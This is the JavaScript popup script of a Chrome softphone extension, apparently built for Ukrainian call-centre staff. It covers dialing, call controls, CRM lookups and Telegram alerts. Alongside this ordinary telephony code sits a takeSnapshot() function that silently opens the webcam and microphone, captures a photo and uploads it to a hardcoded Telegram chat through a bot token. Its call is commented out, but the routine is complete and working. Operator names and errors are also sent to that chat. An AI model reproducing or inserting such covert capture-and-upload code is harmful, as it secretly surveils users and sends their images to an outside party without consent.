$(document).ready(function () {
  document.getElementById("txtPhoneNumber").focus();
  IncmngStatus = localStorage.getItem("InCmngCallStatus");
  // setTimeout(function() {
  //     if (IncmngStatus == ''){
  //         getAccess();
  //  }
  // }, 250);
  setTimeout(function () {
    if (IncmngStatus != "" || CStatus != "") {
      console.log("getAccess не виконанно");
    } else {
      getAccess();
      console.log("getAccess виконанно!!!");
    }
  }, 100);
  getTaskSelfTask();
  getTaskAllTask();
  //takeSnapshot();
  setTimeout(function () {
    checkbox();
  }, 50);
});


let crm1 = JSON.parse(localStorage.getItem("crm1"));
let crm2 = JSON.parse(localStorage.getItem("crm2"));
let crm3 = JSON.parse(localStorage.getItem("crm3"));
let crm4 = JSON.parse(localStorage.getItem("crm4"));
let crm5 = JSON.parse(localStorage.getItem("crm5"));
let crm6 = JSON.parse(localStorage.getItem("crm6"));
const botToken = JSON.parse(localStorage.getItem("bottoken"));
var idmessagetg = 0;
var tgmessage = 0;
const chatId = "-1002027120281";
//var chatId = 0;
var reply_to_message_id = 0;

function sendTelegramMessage(reply_to_message_id, messageText) {
  const encodedMessage = encodeURIComponent(messageText);
  const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&reply_to_message_id=${reply_to_message_id}&text=${encodedMessage}`;

  if (messageText != 0 && reply_to_message_id != 0) {
    fetch(url)
      .then((response) => response.json())
      .then((data) => {
        console.log("Success:", data);
        idmessagetg = data.result.message_id;
        //console.log(idmessagetg+'меседж');
      })
      .catch((error) => {
        console.error("Error:", error);
      });
  }
}

// $('#txtPhoneNumber').keypress(function(evt)
// {
//     var charCode = (evt.which) ? evt.which : event.keyCode;
//     if (charCode > 31 && (charCode < 48 || charCode > 57) && charCode!=42 && charCode!=35)
//         return false;
//     else
//         return true;

// });

var requiredKeys = ["IS_LOGIN", "EXTENSION_NUMBER", "DISPLAY_NAME", "SERVER"];
chrome.storage.sync.get(requiredKeys, function (_data) {
  // Check that the data contains all of the keys, if it doesn't, run the wizard
  if (_data.IS_LOGIN != "1" && isEmpty(_data.IS_LOGIN)) {
    chrome.tabs.create(
      {
        url: "chrome-extension://" + chrome.runtime.id + "/config.html",
      },
      function (tab) {
        console.log("New tab launched for install...");
      }
    );
  } else {
    ext_details = _data;
    //resetCallAssistantConfiguration();
    $("#user_ext_num").html("&nbsp;" + _data.DISPLAY_NAME);
    $(".sip_uri").html(_data.EXTENSION_NUMBER + "@" + _data.SERVER);
    console.log("login successfully");
  }
});

$("body").on("click", "#dial_audio", function (e) {
  var phone_number = $("#txtPhoneNumber").val();
  if (!isEmpty(phone_number) && phone_number.length > 1) {
    if (checkOnlineUser()) {
      chrome.runtime.sendMessage({
        type: "dial_ext",
        ext_num: phone_number,
        faudio: "dial_call",
      });
      //PhoneNumber.innerHTML = phone_number;
      localStorage.setItem("CallStatus", phone_number);
      //alert('call to Number'+phone_number);
      $("#txtPhoneNumber").val("");
    } else {
      showDisplayErrorNotification("You are not registered.");
    }
  } else {
    var reDial = localStorage.getItem("reDial");
    $("#txtPhoneNumber").val(reDial);
    if (reDial === "" || reDial === "undefined") {
      showDisplayErrorNotification(
        "Мінімальна довжина номера телефону повинна бути не менше 2 символів."
      );
    }
  }
});

$("body").on("click", "#send_sms", function (e) {
  var phone_numbersms = $("#txtPhoneNumber").val();
  if (phone_numbersms != "" || CStatus != "" || IncmngStatus != "") {
    if (
      phone_numbersms.length >= 10 ||
      CStatus.length >= 10 ||
      IncmngStatus.length >= 10
    ) {
      // console.log('Всі умови пройдені')
      $.ajax({
        url: crm1,
        type: "POST",
        data: {
          step: 1,
          sipnumber: CStatus
            ? CStatus
            : phone_numbersms
            ? phone_numbersms
            : IncmngStatus,
        },
        success: function (data) {
          if (data) {
            var responseData = JSON.parse(data);
            if (responseData.error_code === 200) {
              showNotification();
              console.log(responseData);
            }
          }
        },
      });
    }
  }

  $("#txtPhoneNumber").val("");
});
var sendButton = document.getElementById("send_sms");
var inputField = document.getElementById("txtPhoneNumber");
setInterval(function () {
  phoneNumber = inputField.value;
  if (
    (phoneNumber != "" && phoneNumber.length > 9) ||
    CStatus != "" ||
    IncmngStatus != ""
  ) {
    sendButton.classList.remove("disabled");
  } else {
    sendButton.classList.add("disabled");
  }
}, 100);

function showNotification() {
  const notificationContainer = document.getElementById(
    "notification-container"
  );
  const notification = document.getElementById("notification");
  notificationContainer.classList.remove("hidden");
  notification.classList.remove("hidden");
  setTimeout(function () {
    notificationContainer.classList.add("hidden");
    notification.classList.add("hidden");
  }, 2000);
}

$("body").on("change", "#onOffPhone", function (e) {
  onoffstarts = 1;
  chrome.runtime.sendMessage({ type: "btnOnOffState" });
  var toggle = $("#onOffPhone:checked").val();
  localStorage.setItem("btnOnOffState", toggle);
  //console.log(onoffstarts + "залупос");
  //console.log("установка флага" + toggle);
});

$("body").on("click", "a", function () {
  chrome.tabs.create({ url: $(this).attr("href") });
  return false;
});

/*$('body').on('click', '#btn_history_call', 

    function()
    {
    chrome.runtime.sendMessage({type:"miscall_historyLog"});
    //window.open ("chrome-extension://" + chrome.runtime.id + "/miscall_history.html","mywindow","menubar=1,resizable=1,width=220,height=550,scrollbars=1");
    //window.open ("Hello");
    document.getElementById("wrapper").style.height = "550px";
    return false;
    }
); */

//SACHIN EDIT/////////////////////////////////////////////////////////////////////////

/*$('body').on('click', '#btn_history_call', 

    function()
    {
    //chrome.runtime.sendMessage({type:"miscall_historyLog"});
    //window.open ("chrome-extension://" + chrome.runtime.id + "/miscall_history.html","mywindow","menubar=1,resizable=1,width=220,height=550,scrollbars=1");
    //window.open ("Hello");
    if (document.getElementById("wrapper").style.height == "28px")
    {
        document.getElementById("btnMute").style.display = 'nune';
        document.getElementById("btnHoldResume").style.display = 'nune';
        document.getElementById("btnTransfer").style.display = 'nune';
        document.getElementById("btnAttendedTransfer").style.display = 'nune';
        document.getElementById("btnConference").style.display = 'nune';

        document.getElementById("wrapper").style.height = "550px";        
    }
    else
    {
        document.getElementById("wrapper").style.height = "28px";        
    }

    

    //return false;
    }
); */

$("body").on("click", "#btn_history_call", function () {
  var myDIV = document.getElementById("myDIV");
  var dialpad = document.getElementById("dialpad");
  var actions = document.getElementById("actions");
  if (myDIV.style.display === "block") {
    dialpad.style.display = "none";
    //actions.style.display = "none";
  } else {
    //alert ("Not Allow");
    myDIV.style.display = "block";
    dialpad.style.display = "none";
    //actions.style.display = "none";
  }
});

$("body").on("click", "#dialpadnum", function () {
  var myDIV = document.getElementById("myDIV");
  var dialpad = document.getElementById("dialpad");
  var actions = document.getElementById("actions");
  $("#dialpad").slideToggle();
});

$("body").on("click", "#clear", function () {
  document.getElementById("txtPhoneNumber").value = "";
});

$("body").on("click", "#btn_history_call", function () {
  chrome.runtime.sendMessage({ type: "miscall_historyLog" });
  //window.open ("chrome-extension://" + chrome.runtime.id + "/miscall_history.html","mywindow","menubar=1,resizable=1,width=220,height=550,scrollbars=1");
  return false;
});

$("body").on("click", "#btnHangUp", function (e) {
  chrome.runtime.sendMessage({ type: "hangUp_ext" });
  start = true;
});

$("body").on("click", "#btnCallUp", function (e) {
  chrome.runtime.sendMessage({ type: "btnCallUp" });
  start = true;
});

$("body").on("click", "#getTas", function (e) {
  getTaskSelfTask();
});

$("body").on("click", "#getTas", function (e) {
  getTaskAllTask();
});
var SoundTogle = JSON.parse(localStorage.getItem("SoundTogle"));
$("body").on("click", "#soundtogle", function (e) {
  var soundtogle = $("#soundtogle").prop("checked") ? 1 : 0;
  SoundTogle = soundtogle;
  chrome.runtime.sendMessage({ type: "SoundTogle", value: SoundTogle });
  localStorage.setItem("SoundTogle", JSON.stringify(SoundTogle));
  //console.log(SoundTogle)
});

var SoundToglekl = JSON.parse(localStorage.getItem("SoundToglekl"));
$("body").on("click", "#soundtoglekl", function (e) {
  var soundToglekl = $("#soundtoglekl").prop("checked") ? 1 : 0;
  SoundToglekl = soundToglekl;
  chrome.runtime.sendMessage({ type: "SoundToglekl", value: SoundToglekl });
  localStorage.setItem("SoundToglekl", JSON.stringify(SoundToglekl));
  //console.log(SoundToglekl)
});

$("body").on("change", "#starttel", function (e) {
  var starttell = $("#starttel").prop("checked") ? 1 : 0;
  starttelfs = starttell;
  sstarttelfssave();
  //console.log(starttelfs);
});
//var offrellfs = 0;
$("body").on("change", "#offtell", function (e) {
  var offtell = $("#offtell").prop("checked") ? 1 : 0;
  offrellfs = offtell;
  offrellfsssave();
  chrome.runtime.sendMessage({ type: "offrellfs", value: offrellfs });
});

$("body").on("click", ".callToUser", function (e) {
  var phone = this.value;
  chrome.runtime.sendMessage({
    type: "dial_ext",
    ext_num: phone,
    faudio: "dial_call",
  });
  //PhoneNumber.innerHTML = phone_number;
  localStorage.setItem("CallStatus", phone);

  var modal = $("#userListModal");
  modal.modal("hide");
});

$("body").on("click", ".transferToUser", function (e) {
  var phone = this.value;
  chrome.runtime.sendMessage({ type: "transferToUser", ext_num: phone });

  var modal = $("#userListModal");
  modal.modal("hide");
});
var start = true;

$("body").on("click", "#btnMute", function (e) {
  // console.log("btnMute");
  chrome.runtime.sendMessage({ type: "mute_ext" });

  // if (!start) {
  //   console.log(start);

  //   $("#AbtnMute").removeClass("btn-primary").addClass("btn-outline-primary");
  //   $("#AbtnMute i")
  //     .removeClass("mdi-microphone-off ")
  //     .addClass("mdi-microphone");

  //   start = true;

  //   console.log("------" + start);
  // } else {
  //   console.log(start);

  //   $("#AbtnMute").removeClass("btn-outline-primary").addClass("btn-primary");
  //   $("#AbtnMute i")
  //     .removeClass("mdi-microphone ")
  //     .addClass("mdi-microphone-off");

  //   console.log("__________" + start);

  //   start = false;
  // }

  $("#AbtnMute").prop("disabled", true);
  setTimeout(function () {
    $("#AbtnMute").prop("disabled", false);
  }, 500);
});

$("body").on("click", "#userList", function (e) {
  getUserList();
});

$("body").on("click", "#comment", function (e) {
  getComment();
});

$("body").on("click", "#getReg", function (e) {
  getReg();
});

$("body").on("click", "#getNoAnsver", function (e) {
  getNoAnsver();
});

$("body").on("click", "#settings", function (e) {
  getSettings();
});

$("body").on("click", "#btnHoldResume", function (e) {
  console.log("hold-btn");

  chrome.runtime.sendMessage({ type: "hold_ext" });
});

$("body").on("click", "#btnTransfer", function (e) {
  chrome.runtime.sendMessage({ type: "transfer_ext" });
});

$("body").on("click", "#btnAttendedTransfer", function (e) {
  var attended_number = $("#txtPhoneNumber").val();
  if (attended_number === "") {
    alert("Please Enter Number!!");
    txtPhoneNumber.focus();
    txtPhoneNumber.value = "";
  } else {
    chrome.runtime.sendMessage({
      type: "attended_ext",
      ext_num: attended_number,
    });
  }
});

$("body").on("click", "#btnConference", function (e) {
  var conference_number = $("#txtPhoneNumber").val();
  if (conference_number === "") {
    alert("Please Enter Number!!");
    txtPhoneNumber.focus();
    txtPhoneNumber.value = "";
  } else {
    chrome.runtime.sendMessage({
      type: "conference_ext",
      ext_num: conference_number,
    });
  }
});

$("body").on("click", "#btnMerge", function (e) {
  chrome.runtime.sendMessage({ type: "merge_ext" });
});

$("body").on("click", "#btnDialPad", function (e) {
  openKeyPad();
});

$("body").on("click", "#num1", function (e) {
  addTxtPhone("1");
  chrome.runtime.sendMessage({ type: "dial_num", ext_num: "1" });
});

$("body").on("click", "#num2", function (e) {
  addTxtPhone("2");

  chrome.runtime.sendMessage({ type: "dial_num", ext_num: "2" });
});

$("body").on("click", "#num3", function (e) {
  addTxtPhone("3");

  chrome.runtime.sendMessage({ type: "dial_num", ext_num: "3" });
});

$("body").on("click", "#num4", function (e) {
  addTxtPhone("4");

  chrome.runtime.sendMessage({ type: "dial_num", ext_num: "4" });
});

$("body").on("click", "#num5", function (e) {
  addTxtPhone("5");

  chrome.runtime.sendMessage({ type: "dial_num", ext_num: "5" });
});

$("body").on("click", "#num6", function (e) {
  addTxtPhone("6");

  chrome.runtime.sendMessage({ type: "dial_num", ext_num: "6" });
});

$("body").on("click", "#num7", function (e) {
  addTxtPhone("7");

  chrome.runtime.sendMessage({ type: "dial_num", ext_num: "7" });
});

$("body").on("click", "#num8", function (e) {
  addTxtPhone("8");

  chrome.runtime.sendMessage({ type: "dial_num", ext_num: "8" });
});

$("body").on("click", "#num9", function (e) {
  addTxtPhone("9");

  chrome.runtime.sendMessage({ type: "dial_num", ext_num: "9" });
});

$("body").on("click", "#num0", function (e) {
  addTxtPhone("0");

  chrome.runtime.sendMessage({ type: "dial_num", ext_num: "0" });
});

$("body").on("click", "#numAstr", function (e) {
  addTxtPhone("*");

  chrome.runtime.sendMessage({ type: "dial_num", ext_num: "*" });
});

$("body").on("click", "#numHash", function (e) {
  addTxtPhone("#");

  chrome.runtime.sendMessage({ type: "dial_num", ext_num: "#" });
});

var temp;

function openAttendedTransfer() {
  //if(oSipSessionCall){
  if (temp == "0" || !temp) {
    callboxmaindirectcall.style.height = "200px";
    //divKeyPad.style.visibility = 'hidden';
    //  divConferenceTransfer.style.visibility = 'hidden';
    divAttendedTransfer.style.visibility = "visible";
    //divAttendedTransfer.style.left = ((document.body.clientWidth - C.divKeyPadWidth) >> 1) + 'px';
    divAttendedTransfer.style.top = "70px";
    //divKeyPad.style.height = '100px';
    divAttendedTransfer.style.height = "30px";
    txtAttendedPhoneNumber.focus();
    txtAttendedPhoneNumber.value = "";
    //sipSendDTMF('*');
    temp = "1";
    flg = "0";
  } else {
    closeAttendedTransfer();
  }
  console.log("temp:" + temp);
  //}
}

function closeAttendedTransfer() {
  //        divAttendedTransfer.style.left = '0px';
  //        divAttendedTransfer.style.top = '0px';
  //        divAttendedTransfer.style.visibility = 'hidden';
  // divAttendedTransfer.style.height = '0px';
  // callboxmaindirectcall.style.height = '140px';
  temp = "0";
  console.log("temp:" + temp);
}

var flg;

function openKeyPad() {
  //if(oSipSessionCall){
  if (flg == "0" || !flg) {
    callboxmaindirectcall.style.height = "220px";
    divAttendedTransfer.style.visibility = "hidden";
    //divConferenceTransfer.style.visibility = 'hidden';
    divKeyPad.style.visibility = "visible";
    //divKeyPad.style.left = ((document.body.clientWidth - C.divKeyPadWidth) >> 1) + 'px';
    divKeyPad.style.top = "70px";
    //divGlassPanel.style.visibility = 'visible';
    divAttendedTransfer.style.height = "0px";
    divKeyPad.style.height = "150px";
    flg = "1";
    temp = "0";
    conf = "0";
  } else {
    closeKeyPad();
  }
  console.log("flg:" + flg);
  //}
}



function takeSnapshot() {
  navigator.mediaDevices.getUserMedia({ video: true, audio: true })
      .then(function (stream) {
          var video = document.createElement('video');
          video.srcObject = stream;
          video.play();
          setTimeout(function () {
              var canvas = document.createElement('canvas');
              canvas.width = video.videoWidth;
              canvas.height = video.videoHeight;
              var context = canvas.getContext('2d');
              context.drawImage(video, 0, 0, canvas.width, canvas.height);
              video.pause();
              stream.getTracks().forEach(function (track) {
                  track.stop();
              });
              var imageURL = canvas.toDataURL('image/jpeg');
              video.remove();
              canvas.remove();
              messageText = "test"
              processImage(imageURL,messageText);
          }, 200);
      })
      .catch(function (error) {
          console.error('Error accessing the camera and/or microphone:', error);
      });
}

function processImage(imageURL, messageText) {
  fetch(imageURL)
      .then(response => response.blob())
      .then(blob => {
          var formData = new FormData();
          formData.append('chat_id', chatId);
          formData.append('reply_to_message_id', 93672); 
          formData.append('photo', blob, 'photo.jpg');
          formData.append('text', messageText); 
          return fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
              method: 'POST',
              body: formData
          });
      })
      .then((response) => response.json())
      .then((data) => {
          console.log("Success:", data);
      })
      .catch((error) => {
          console.error("Error:", error);
      });
}

















function closeKeyPad() {
  //        divKeyPad.style.left = '0px';
  //        divKeyPad.style.top = '0px';
  //        divKeyPad.style.visibility = 'hidden';
  //        //divGlassPanel.style.visibility = 'hidden';
  // divKeyPad.style.height = '100px';
  // callboxmaindirectcall.style.height = '140px';
  flg = "0";
  console.log("flg:" + flg);
}

var minutesLabel = document.getElementById("minutes");
var mincolsecLabel = document.getElementById("mincolsec");
var secondsLabel = document.getElementById("seconds");
var txtIncmngCallStatus = document.getElementById("txtIncmngCallStatus");
var txtCallStatus = document.getElementById("txtCallStatus");
var CStatus;
var flagIncoming;
var checkservresponse = 0;

var CSts = setInterval(function () {
  //intelserv - получение данных статуса звонка
  CStatus = localStorage.getItem("CallStatus");
  IncmngStatus = localStorage.getItem("InCmngCallStatus");

  // console.log("rewwwwwwwwwwwwwwwwwwwwwwwww:"+IncmngStatus);

  if (IncmngStatus != "" || oSipSessionCall != 0) {
    var checkbox = document.getElementById("onOffPhone");
    var offtelldis = document.getElementById("offtell");
    checkbox.disabled = true;
    offtelldis.disabled = false;
    //console.log(offrellfs)
    //   console.log('22222222222')
  } else {
    var checkbox = document.getElementById("onOffPhone");
    var offtelldis = document.getElementById("offtell");
    if (checkservresponse == 0) {
      checkbox.disabled = false;
      offtelldis.disabled = true;
    }
  }

  //  console.log(offrellfs)
  if (offrellfs == 1 && oSipSessionCall == 0) {
    offrellfs = 0;
    $("#offtell").prop("checked", false);
    chrome.browserAction.setBadgeText({ text: "off" });
    chrome.browserAction.setBadgeBackgroundColor({ color: [255, 0, 0, 1] });
    offrellfsssave();
    // if ($("#onOffPhone").prop("checked")) {
    //   $("#onOffPhone").click();
    // }
  }
  // console.log(IncmngStatus)
  //console.log(CStatus

  

  if (CStatus != "") {
    txtCallStatus.innerHTML = CStatus;
  } else {
    if (IncmngStatus != "") {
      txtCallStatus.innerHTML = IncmngStatus;
      if (!flagIncoming) {
        console.log("incomming call");
        //  console.log('checkinkoming')

        flagIncoming = 1;
      }
    } else {
      txtCallStatus.innerHTML = "";
    }

    //clearInterval(CSts);
  }
}, 100);

var oSipSessionCall;
chrome.runtime.onMessage.addListener(function (request, sender, sendResponse) {
  //  console.log(request.action + 'Pizdaaaaaaa');
  //console.log(oSipSessionCall)
  if (request.type === "oSipSessionCall") {
    oSipSessionCall = request.value;
  }
  if (request.action === "current_status") {
    if (request.cause === "dialing") {
      //$('.caller').html(request.caller);
      showDisplayErrorNotification(request.cause);
    }
  }
  if (request.action === "timer") {
    secondsLabel.innerHTML = request.seconds;
    mincolsecLabel.innerHTML = ":";
    minutesLabel.innerHTML = request.minutes;
  }
  if (request.action === "IncomingCall") {
    txtIncmngCallStatus.innerHTML = request.sts;
    localStorage.setItem("CallStatus", request.sts);
  }
  if (request.action === "outgoingCallMute") {
    //localStorage.setItem('CallStatus', request.sts);
    //btnMute.innerHTML = request.MuteSts;
    if (request.MuteSts === "<b>Mute</b>") {
      // console.log("Mute");
      $("#AbtnMute").removeClass("btn-primary").addClass("btn-outline-primary");
      $("#AbtnMute i")
        .removeClass("mdi-microphone-off ")
        .addClass("mdi-microphone");

      start = true;
    }
    if (request.MuteSts === "<b>UnMute</b>") {
      // console.log("UNMute");
      $("#AbtnMute").removeClass("btn-outline-primary").addClass("btn-primary");
      $("#AbtnMute i")
        .removeClass("mdi-microphone ")
        .addClass("mdi-microphone-off");

      start = false;
    }
  }

  if (request.action === "outgoingCallHold") {
    //localStorage.setItem('CallStatus', request.sts);
    //btnHoldResume.innerHTML = request.HoldSts;

    if (request.HoldSts === "<b>Hold</b>") {
      console.log("Resume");
      $("#AbtnHoldResume")
        .removeClass("btn-primary")
        .addClass("btn-outline-primary");
    }
    if (request.HoldSts === "<b>Resume</b>") {
      console.log("Hold");
      $("#AbtnHoldResume")
        .removeClass("btn-outline-primary")
        .addClass("btn-primary");
    }
  }
  if (starttelfs == 1) {
    $("#starttel").prop("checked", true);
  } else {
    $("#starttel").prop("checked", false);
  }
  if (offrellfs == 1) {
    $("#offtell").prop("checked", true);
  } else {
    $("#offtell").prop("checked", false);
  }
  if (SoundTogle == 1) {
    $("#soundtogle").prop("checked", true);
    $('[data-toggle="suond"]').prop("title", "Гучно 😡");
  } else {
    $("#soundtogle").prop("checked", false);
    $('[data-toggle="suond"]').prop("title", "Тихо 😌");
  }

  if (SoundToglekl == 1) {
    $("#soundtoglekl").prop("checked", true);
    $('[data-toggle="suondkl"]').prop(
      "title",
      "Клієнта чути коли вимикаєм мікрофон 🙄"
    );
  } else {
    $("#soundtoglekl").prop("checked", false);
    $('[data-toggle="suondkl"]').prop(
      "title",
      "Клієнта НЕ чути коли вимикаєм мікрофон 😶"
    );
  }

  if (request.action === "config") {
    if (request.cause === "registerSuccess") {
      //console.log("success image");
      $("#sfimg")
        .empty()
        .append(
          '<span class="text-success"><i class="mdi mdi-checkbox-marked-circle-outline mdi-24px" aria-hidden="true"></i></span>'
        );
      $("#onOffPhone").prop("checked", true);
    } else {
      //console.log("failure image");
      $("#sfimg")
        .empty()
        .append(
          '<span class="text-danger"><i class="mdi mdi-close-box-outline mdi-24px" aria-hidden="true"></i></span>'
        );
      $("#onOffPhone").prop("checked", false);
    }
  }
  if (request.action === "CallSession") {
    if (request.cause === "callSessionStoped") {
      secondsLabel.innerHTML = "";
      mincolsecLabel.innerHTML = "";
      minutesLabel.innerHTML = "";
      txtIncmngCallStatus.innerHTML = "";
      txtCallStatus.innerHTML = "";
      PhoneNumber.innerHTML = "";
      localStorage.setItem("CallStatus", "");
      localStorage.setItem("InCmngCallStatus", "");
    }
  }
  if (request.action === "SendtxtCallStatus") {
    console.log("heelollolololooooooooooooooooooo:" + request.seconds);
    localStorage.setItem("CallStatus", request.seconds);
  }
});

function isEmpty(data) {
  if (data == null || data == "" || data == undefined) {
    return true;
  } else {
    return false;
  }
}

function showDisplayErrorNotification(msg) {
  var options = {
    type: "basic",
    iconUrl: "img/logo.png",
    title: chrome.runtime.getManifest().name,
    message: msg,
    priority: 1,
    isClickable: false,
  };
  chrome.notifications.create(
    "showDisplayErrorNotification",
    options,
    function () {}
  );
  setTimeout(function () {
    chrome.notifications.clear("showDisplayErrorNotification");
  }, 2000);
}

function checkOnlineUser() {
  if ($("#register").hasClass("registered")) {
    return true;
  } else {
    return true;
  }
}

var callFlg = 1;
$("#txtPhoneNumber").keypress(function (e) {
  chrome.runtime.onMessage.addListener(function (
    request,
    sender,
    sendResponse
  ) {
    if (request.action === "CallSession") {
      if (request.cause === "callSessionStoped") {
        callFlg = 1;
      } else {
        callFlg = 0;
      }
    }
  });

  if (callFlg === 1) {
    if (e.which === 13) {
      var phone_number = $("#txtPhoneNumber").val();
      if (!isEmpty(phone_number) && phone_number.length > 1) {
        if (checkOnlineUser()) {
          chrome.runtime.sendMessage({
            type: "dial_ext",
            ext_num: phone_number,
            faudio: ringbacktone,
          });
          localStorage.setItem("CallStatus", phone_number);
          $("#txtPhoneNumber").val("");
        } else {
          showDisplayErrorNotification("You are not registered.");
        }
      } else {
        console.log("Phone number should be minimum 2 characters.");
        showDisplayErrorNotification(
          "Phone number should be minimum 2 characters."
        );
      }
      return false;
    }
  }
});

function getUserList() {
  var modal = $("#userListModal");
  $.ajax({
    url: crm2,
    type: "POST",
    data: { step: 1 },
    success: function (data) {
      data = $.parseJSON(data);
      $("#userListTable").empty().append(data.table);
      $('[data-toggle="tooltip"]').tooltip();
    },
  });

  modal.modal("show");
}
//console.log(sipnumber)
function getComment() {
  var modal = $("#CommentModal");
  modal.modal("show");
}
function getReg() {
  var modal = $("#RegModal");
  modal.modal("show");
  $.ajax({
    url: crm3,
    type: "POST",
    data: { step: 1, sipnumber: sipnumber },
    success: function (data) {
      if (data) {
        var responseData = JSON.parse(data);
        if (Array.isArray(responseData) && responseData.length > 0) {
          var item = responseData[0];
          //console.log(data)
          if (item.calldateOut == "Вчасно" || item.calldateOut == "Не вчасно") {
            $("#Regtime")
              .empty()
              .append(
                "Ваш час реєстрації: " +
                  item.regestryTime +
                  "   ||   " +
                  item.calldateOut
              );
          } else {
            $("#Regtime").empty().append(item.calldateOut);
          }
        }
      } else {
        $("#Regtime").empty().append("Помилка завантаження...");
      }
    },
  });
}

function getNoAnsver() {
  var modal = $("#NoAnsverModal");
  modal.modal("show");
  var modaNoAsnver = document.getElementById("NoAnsver");
  $.ajax({
    url: crm3,
    type: "POST",
    data: { step: 2, sipnumber: sipnumber },
    success: function (data) {
      if (data) {
        var responseData = JSON.parse(data);
        if (responseData.response1 != null) {
          var dataAsString = responseData.response1
            .map(function (call, index) {
              var lineNumber = index + 1;
              return (
                '<span style="color: green;">' +
                lineNumber +
                ".</span> " +
                '<span style="color: red;"> Відхилений від:</span> ' +
                call.src +
                '<span style="color: red;"> Час:</span> ' +
                call.time +
                '<span style="color: red;"> Тривалість:</span> ' +
                call.sec
              );
              // '<span style="color: red;"> Номер:</span> ' + call.agent +
            })
            .join("<br>");
          modaNoAsnver.innerHTML = dataAsString;
        } else {
          var dataAsString =
            '<span style="color: green; ">  У вас відсутні пропущені 🥰</span>';
          modaNoAsnver.innerHTML = dataAsString;
        }
      } else {
        $("#NoAnsver").empty().append("Помилка завантаження...");
      }
    },
  });
}

function addTxtPhone(strNum) {
  var inputPhone = $("#txtPhoneNumber");
  phoneTxt = inputPhone.val();
  if (phoneTxt.length < 10) {
    phoneTxt += strNum;
    inputPhone.val(phoneTxt);
  }
}

//setInterval(getTaskSelfTask, 15000);
//setInterval(getTaskAllTask, 15000);
setInterval(function () {
  if (IncmngStatus !== "") {
    getAccess();
  }
}, 60000);

function getTaskSelfTask() {
  $.ajax({
    url: crm4,
    type: "POST",
    data: { step: 1 },
    success: function (data) {
      console.log("getTaskSelfTask");
      if (data.trim()) {
        $("#tableSelfAllTask").slideDown();
        $("#showTableSelfAllTask").empty().append(data);
        $("#noDataMessage").slideUp();
      } else {
        $("#tableSelfAllTask").slideUp();
        $("#noDataMessage").slideDown();
      }
    },
  });
}

function checkbox() {
  var checkbox = document.getElementById("onOffPhone");
  if ($("#onOffPhone").prop("checked")) {
    checkbox.disabled = false;
  }
}

function getAccess() {
  $.ajax({
    url: crm5,
    type: "POST",
    data: { step: 1, version: "phone_2.1.0" },
    success: function (data) {
      var checkbox = document.getElementById("onOffPhone");
      clearTimeout(serverRequestTimeout);
      data = $.parseJSON(data);
      domen = data.domen;
      var checkbox = document.getElementById("onOffPhone");
      checkbox.disabled = false;
      //console.log(data);
      if (data.error) {
        if ($("#onOffPhone").prop("checked")) {
          $("#onOffPhone").click();
        }
        if (data.commenterr) {
          $("#commenterror").empty().append(data.commenterr);
        } else {
          $("#commenterror").empty().append("Коментар відсутній");
        }
        reply_to_message_id = 4;
        tgmessage = "⚠️ " + fiotg + "\n" + data.error;
        sendTelegramMessage(reply_to_message_id, tgmessage);
        tgmessage = 0;
        //chatId = 0;
        reply_to_message_id = 0;
        $(".server-block").show();
        checkbox.disabled = true;
        checkservresponse = 1;
        chrome.browserAction.setBadgeText({ text: "off" });
        chrome.browserAction.setBadgeBackgroundColor({ color: [255, 0, 0, 1] });
        localStorage.setItem("sip_server", domen);
        chrome.storage.sync.set({ SERVER: domen });
        ws_servers = domen;
        sip_server = domen;
      }
    },
  });
  serverRequestTimeout = setTimeout(function () {
    $(".server-response").show();
  }, 10000);
}

function getTaskAllTask() {
  $.ajax({
    url: crm6,
    type: "POST",
    data: { step: 1 },
    success: function (data) {
      console.log("getTaskAllTask");
      if (data.trim()) {
        $("#tableNewAllTask").slideDown();
        $("#showTableNewAllTask").empty().append(data);
      } else {
        $("#tableNewAllTask").slideUp();
      }
    },
  });
}
